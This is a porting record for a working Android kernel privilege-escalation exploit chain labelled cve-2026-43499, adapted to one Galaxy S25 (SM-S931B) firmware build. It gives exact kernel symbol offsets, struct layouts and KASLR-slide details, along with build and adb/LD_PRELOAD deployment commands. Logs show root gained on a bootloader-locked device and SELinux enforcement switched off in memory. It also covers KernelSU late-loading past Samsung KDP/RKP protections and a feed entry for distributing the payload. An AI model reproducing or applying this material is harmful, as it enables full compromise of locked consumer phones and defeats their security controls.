# SM-S931B / S931BXXUCZZHL porting record

**Status: Port complete, hardware-validated.** Every value
below was derived from the exact target kernel Image and its BTF; nothing is
copied from another build without verification.

## 1. Firmware identity

| field | value |
| --- | --- |
| model | `SM-S931B` (Galaxy S25, Snapdragon 8 Elite, codename `pa1q`) |
| AP/PDA | `S931BXXUCZZHL` |
| display build | `CP2A.260605.016.S931BXXUCZZHL` (Android 17, SDK 37) |
| security patch | `2026-08-05` |
| build fingerprint | `samsung/pa1qxxx/pa1q:17/CP2A.260605.016/S931BXXUCZZHL:user/release-keys` |
| kernel release | `6.6.127-android15-8-paa4b906-abogkiS931BXXUCZZHL-4k` |
| kernel size | `39115264` |
| kernel SHA-256 | `02fe55bc766498ba577ea6c9c657e162abca81a88986d89f0196701e8771b2a4` |
| BTF interval in Image | `[0x18aca6c, 0x1ecd673)` (6425607 bytes) |
| boot.img SHA-256 | `038dcc65ca152b119d9df7cc0ff81a6724c0a64174dfc4a200f5d06e595da468` |

Why a separate profile: the shared `galaxy-s25-series` payload is built from
`pa3q-S938NKSUACZF1` (kernel `6.6.98-android15-8-p5a696e2-abogki`). This
device is on the newer `paa4b906-abogki` GKI base (6.6.127), so every
text/data offset differs. It is the same situation as `pa2q-S9360ZCSCCZG1`
against the stock S25-series payload.

## 2. Structural layouts (from the target BTF, byte-exact)

These all match the 6.6 `pa3q` profile exactly, so the shared exploit logic is
unchanged:

- `rt_mutex_waiter` size `0x70`: `tree` `0x0` (`prio` `0x18`, `deadline` `0x20`),
  `pi_tree` `0x28` (`prio` `0x40`, `deadline` `0x48`), `task` `0x50`,
  `lock` `0x58`, `wake_state` `0x60`, `ww_ctx` `0x68`.
- `task_struct` fields: `usage` `0x40`, `prio` `0x84`, `normal_prio` `0x8c`,
  `sched_task_group` `0x348`, `pi_lock` `0x90c`, `pi_waiters` `0x920`,
  `pi_top_task` `0x930`, `pi_blocked_on` `0x938` (size `0x12c0`).
- `file_operations`: `unlocked_ioctl` `0x48`, `compat_ioctl` `0x50`,
  `mmap` `0x58`, `open` `0x68`, `release` `0x78`, `splice_read` `0xb8`,
  `show_fdinfo` `0xd8` (size `0x108`).
- `page` size `0x40`, `compound_head` `0x08`, slab view `slab_cache` `0x08`
  (`struct slab` overlay; `struct page` itself has no `slab_cache` member in
  6.6 — the slab fields live in `struct slab`, `slab_cache` at `0x8`), and
  `page_type` `0x30`, `_refcount` `0x34`.
- `configfs_buffer`: `page` `0x10`, `needs_read_fill` `0x50`,
  `bin_buffer` `0x58`, `bin_buffer_size` `0x60`, `cb_max_size` `0x64`.
- Workqueue: `workqueue_struct.dfl_pwq` `0xb0`; `pool_workqueue` `pool` `0x0`,
  `wq` `0x8`, `work_color` `0x10`, `refcnt` `0x18`, `nr_in_flight` `0x1c`,
  `nr_active` `0x5c`, `max_active` `0x60`; `worker_pool.worklist` `0x28`,
  `nr_idle` `0x3c`; `work_struct` `data` `0x0`, `entry` `0x8`, `func` `0x18`.
- `selinux_state.enforcing` = `0x0`; `miscdevice.fops` = `0x10`.
- `pipe_buffer` size `0x28`: `page` `0x0`, `offset` `0x8`, `len` `0xc`,
  `ops` `0x10`, `flags` `0x18`.
- `ctl_table` size `0x40` (9 members) — used for the `boot_id` scan below.

`mm_struct` size is `0x4c0`; the default `MM_STRUCT_SZ 0x500` SLUB stride is
kept (same struct size as the device-tested 6.6.98 `pa3q` build, which also
uses the default).


## 3. Symbol offsets (from `vmlinux-to-elf`, base `0xffffffc080000000`)

The base address convention matches the other Snapdragon 8 Elite targets.

| macro | symbol / derivation | offset |
| --- | --- | ---: |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x000d1278` |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | instruction after the blocking `worker_thread -> bl schedule` | `0x000d9ba0` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x003cb7f8` |
| `COPY_SPLICE_READ_OFF` | `copy_splice_read` | `0x004190cc` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x004983d4` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x00498900` |
| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x00d7e744` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `compat_ashmem_ioctl` | `0x00d7ee00` |
| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x00d7ee54` |
| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x00d7f074` |
| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x00d7f0fc` |
| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x00d7f188` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x01278148` |
| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x01437480` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `"nfnetlink_log"` string (qword 0 of `nfulnl_logger`) | `0x01791639` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x0180e538` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x0233ac60` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` object | `0x02342080` |
| `INIT_TASK_OFF` | `init_task` | `0x0234e2c0` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x0255df80` |
| `SELINUX_ENFORCING_OFF` | `selinux_state` + `offsetof(enforcing)=0` | `0x025a0810` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `random_table[4].data` (`boot_id` entry) | `0x024785c8` |
| `SLIDE_SYSCTL_BOOTID_OFF` | `sysctl_bootid` UUID storage | `0x02683910` |
| `ASHMEM_MISC_FOPS_OFF` | `ashmem_misc + 0x10` | `0x024bcd80` |

Derivation cross-checks performed offline:

- `random_table` scan used `sizeof(struct ctl_table) == 0x40` (BTF). Entry
  index 4 has `procname == "boot_id"` and its `.data` slot value equals the
  `sysctl_bootid` symbol address (`0xffffffc082683910`) — self-validating.
- `nfulnl_logger` qword 0 read from the Image is `0xffffffc081791639`; the
  string at that image offset decodes to exactly `nfnetlink_log`.
- `COPY_SPLICE_READ_OFF`: 6.6 removed `generic_file_splice_read`. The fake
  fops `splice_read` slot must point at a same-prototype function that
  services the fake file through its `read_iter`, so this profile uses
  `copy_splice_read` (`0x004190cc`), matching the role documented for the
  5.15 `dm3q-S9180ZHS8FZF5` build. `filemap_splice_read` (`0x002d4530`) is
  the wrong choice for an iter-backed fake file.
- `SLIDE_TRACEFS_EVENT_ID`: `(__event_sched_blocked_reason -
  __start_ftrace_events) / 8 = 89` zero-based index; with the 6.6 GKI
  `__TRACE_LAST_TYPE = 20` the runtime ID is `109`, matching the other 6.6
  profiles (a36xq 6.6.46, and the 6.6.98 default). Verify on device:
  `cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id`.
- `SLIDE_PSELECT_WORD_SHIFT 0` (non-LEGACY waiter words 0-13, nfds=320 →
  15-word array; same reasoning as the 6.6.98 `psq`/`pa2q`/`pa3q` profiles).

## 4. Physical load address (P0)

```c
#define P0_PHYS_OFFSET       0x80000000ULL
#define P0_KERNEL_PHYS_LOAD  0xa8000000ULL
```

Qualcomm 8 Elite values, identical to the device-tested `pa3q`/`pa2q`/`psq`
profiles (`0xa8000000` appears as the LinuxLoader literal in their
`uefi.elf`). Before the first hardware run, confirm against this firmware's
own `vendor_boot.img` DTB (`gunyah_hyp_region@80000000`) or extract the
`uefi.elf` from this OTA and check for the same literal.

## 5. P0 fingerprint

`src/targets/pa1q-S931BXXUCZZHL/p0_fingerprint.h` was generated from this
exact raw Image at probe offset `0x1f0000` with the same algorithm as
`tools/generate_p0_fingerprint.pl` (32 slides x 8 page offsets); all 256
source qwords were independently read back from the Image during generation.
It must not be shared with any other build.

## 6. Kernel configuration (embedded IKCONFIG, extracted)

`CONFIG_MODVERSIONS=y`, `CONFIG_MODULES=y`, `CONFIG_MODULE_UNLOAD=y`,
`CONFIG_KALLSYMS=y`, `CONFIG_KALLSYMS_ALL=y`,
`CONFIG_KALLSYMS_BASE_RELATIVE=y`, `CONFIG_TRIM_UNUSED_KSYMS=y`,
`CONFIG_RANDOMIZE_BASE=y`, `CONFIG_SECURITY_SELINUX=y` (+`DEVELOP`).
`CONFIG_MODULE_FORCE_LOAD` is not set. Full config saved as
`port/ikconfig.txt` alongside the analysis. Consequence for step 8: the
KernelSU module must carry the exact target `vermagic`
(`6.6.127-android15-8-paa4b906-abogkiS931BXXUCZZHL-4k SMP preempt mod_unload
modversions aarch64`) and a correct/relocated `__versions` CRC set; the
late-loader relocation path used by the A56/A36 `android15-6.6` builds
(no-patch-text, Samsung KDP/RKP/DEFEX patch) is the reference for this
Snapdragon 6.6 target.


## 7. Build

```sh
make TARGET=pa1q-S931BXXUCZZHL ANDROID_NDK_HOME=/path/to/android-ndk all
make TARGET=pa1q-S931BXXUCZZHL ANDROID_NDK_HOME=/path/to/android-ndk release
```

Outputs: `build/pa1q-S931BXXUCZZHL/cve-2026-43499` (root-umh),
`cve-2026-43499-app.so` (app), `cve-2026-43499-root` (su daemon). The release
app payload must be exactly `104128` bytes and copied to
`artifacts/pa1q-S931BXXUCZZHL/cve-2026-43499-app.so`. On Windows without
make, run the equivalent NDK clang commands directly (see
`port/build_windows.cmd`).

Header sanity check used during this port (host clang, syntax only):

```sh
clang -fsyntax-only -Isrc \
  -DTARGET_HEADER='"targets/pa1q-S931BXXUCZZHL/target.h"' src/header_check.c
clang -fsyntax-only -Isrc -DAPP_PAYLOAD=1 \
  -DTARGET_HEADER='"targets/pa1q-S931BXXUCZZHL/target.h"' src/header_check.c
```

## 8. KernelSU module (step 7 of PORTING.md)

Apply `kernelsu/patches/KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch` to
KernelSU v3.2.5, build for KMI `android15-6.6` with this target's vermagic,
run `check_symbol` against the recovered `vmlinux.elf`, and audit the
`__versions` CRC table with `kernelsu/tools/extract_target_symvers.py`
against the same ELF. Reference builds: `android15-6.6_kernelsu-s25u-kdp.ko`
(Snapdragon S25 Ultra 6.6.98) and the A56/A36 no-patch-text modules (exact
target vermagic + audited manual relocation). Embed the stripped KO in a
rebuilt `ksud` and name both after the target (`ksud-pa1q-S931BXXUCZZHL-kdp`).

## 9. Support feed (after device validation)

Add one payload entry to `support/targets-v3.json`:

```json
{
  "payloadId": "pa1q-S931BXXUCZZHL",
  "displayName": "Galaxy S25 | Kernel 6.6.127",
  "models": ["SM-S931B"],
  "kernelVersions": ["6.6.127"],
  "exploit": { "url": ".../artifacts/pa1q-S931BXXUCZZHL/cve-2026-43499-app.so", "size": 104128 },
  "kernelsu": { "url": ".../kernelsu/ksud-pa1q-S931BXXUCZZHL-kdp", "size": 0 }
}
```

## 10. SELinux behavior during execution (from src/root.c, not an assumption)

- All exploit stages before root (KASLR slide, fake fops, configfs ARW, pipe
  physical R/W) never touch SELinux.
- The root stage (`install_workqueue_umh_root`) reads
  `selinux_state.enforcing` (aborts if the read fails or the value is not
  0/1), then — **only if the system is enforcing** — writes `0` (permissive)
  into that single `.data` byte, verified by readback, for the duration of
  the usermodehelper spawn. This is an in-memory flip only: no policy
  reload, no `/sys/fs/selinux` write, nothing persisted to flash.
- On failure the cleanup path rolls the byte back to the original value with
  readback verification (`root umh selinux rollback=1 old=1 now=1`).
- On success the payload deliberately leaves the global state permissive
  while the temp-root daemon runs (device records show
  `uid=0 ... context=u:r:kernel:s0`); it is not stealthy about this.
- Nothing survives a reboot: `selinux_state` is reinitialized to the built-in
  default (enforcing) on every boot, and the root itself is per-boot.
- After KernelSU late-load, the Samsung-patched KernelSU grants su **under
  enforcing** (per the repo's hardware records), so the intended end state is:
  KernelSU installed, then `setenforce 1` restored via a root shell.
  Running the whole flow with enforcing never flipped is not supported by
  this route — the UMH helper spawn relies on the permissive window.

## 11. Device validation (2026-09-06) — PASS

Hardware: `SM-S931B` (RFCY40MD5YH), fingerprint
`samsung/pa1qxeea/pa1q:17/CP2A.260605.016/S931BXXUCZZHL_OXMCZZHL:user/release-keys`,
kernel `6.6.127-android15-8-paa4b906-abogkiS931BXXUCZZHL-4k`, bootloader
locked (`ro.boot.flash.locked=1`), verified boot `green`, warranty bit `0`.

Deployment: `cve-2026-43499-app.so` + `cve-2026-43499-root` pushed to
`/data/local/tmp`, then

```sh
adb shell "EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 \
  CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499-app.so /system/bin/id"
```

**Full chain succeeded on attempt 1/24.** Decisive log lines:

```text
[*] pipe caches normal1k=ffffff8001cf4b00 normal2k=ffffff8001cf4c00 cgroup1k=ffffff8001cf4b00 cgroup2k=ffffff8001cf4c00 selected=ffffff8001cf4c00
[*] pipe page idx=0 page=ffffff89ee830000 head=fffffffe27ba0c00 cache08=ffffff8001cf4c00 ... type=ffffffff match=1
[*] phys step probed read done ok=1 idx=156
[*] phys step probed write done ok=1
[*] root umh spans work=ffffff88204ee000-ffffff88204ee06f data=ffffff88204ee200-ffffff88204ee367 selinux=ffffff802a770810 old=1
[*] root umh result wake=1 complete=1 retval=0 socket=1
[+] pipe-physrw-summary pid=22802 done=1 root=1 kaslr=1 base=ffffffc0801d0000 slide=00000000001d0000
[+] pipe physrw pid=22802 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
[+] exploit completed attempt=1/24
```

Root client verified:

```text
$ /data/local/tmp/cve-2026-43499-root -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
$ /data/local/tmp/cve-2026-43499-root -c uname -a
Linux localhost 6.6.127-android15-8-paa4b906-abogkiS931BXXUCZZHL-4k #1 SMP PREEMPT Fri Aug 28 02:24:38 UTC 2026 aarch64 Toybox
```

SELinux was Enforcing before the run (`old=1` in the log), flipped to
permissive only for the UMH handoff as designed, and was restored with
`setenforce 1` afterwards: `getenforce` → `Enforcing`. As expected under
enforcing the temp-root daemon is no longer reachable from the shell context
(`su: connect daemon: Permission denied`) — the daemon remains alive until
reboot but requires the permissive window. Re-running the exploit
re-establishes it. KernelSU late-load still requires the exact-vermagic
module build (section 8).

Root client verified:

```text
$ /data/local/tmp/cve-2026-43499-root -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
$ /data/local/tmp/cve-2026-43499-root -c uname -a
Linux localhost 6.6.127-android15-8-paa4b906-abogkiS931BXXUCZZHL-4k #1 SMP PREEMPT Fri Aug 28 02:24:38 UTC 2026 aarch64 Toybox
```

## 11b. KernelSU late-load — final validation (2026-09-07) — PASS

With `APP_TRACEFS_SLIDE 1` (tracefs KASLR route; event id 109
hardware-confirmed via
`/sys/kernel/tracing/events/sched/sched_blocked_reason/id`) and the
auto-late-load helper (stage → private-ns bind-mount over `/system/bin/logcat`
→ `ksud late-load --allow-shell` → ksud daemon), a settled boot succeeds on
**attempt 1/24**:

```text
[+] pipe-physrw-summary pid=11403 done=1 root=1 kaslr=1 base=ffffffc080070000 slide=0000000000070000
[+] exploit completed attempt=1/24
$ adb shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
$ getenforce
Enforcing
```

KernelSU Manager reports *Working <LKM> [Jailbreak mode]*; granted apps
(e.g. Termux) obtain root via `su` under enforcing. The `su_compat` and
`adb_root` kernel features persist in `/data/adb/ksu/` and are re-applied by
each boot's late-load. Operational notes:

- one exploit success per boot (post-success re-runs hit the per-UID
  pipe-page quota, `F_SETPIPE_SZ → EPERM`); reboot resets everything;
- failed attempts that reach the stack writer set the in-boot interlock
  (`stack writer ran; refusing retry on this boot`) — reboot and retry;
- the root daemon/keeper expire after some minutes; KSU remains for the rest
  of the boot and the exploit can simply be re-run after the next reboot.

## 12. Scope

Hardware tested.

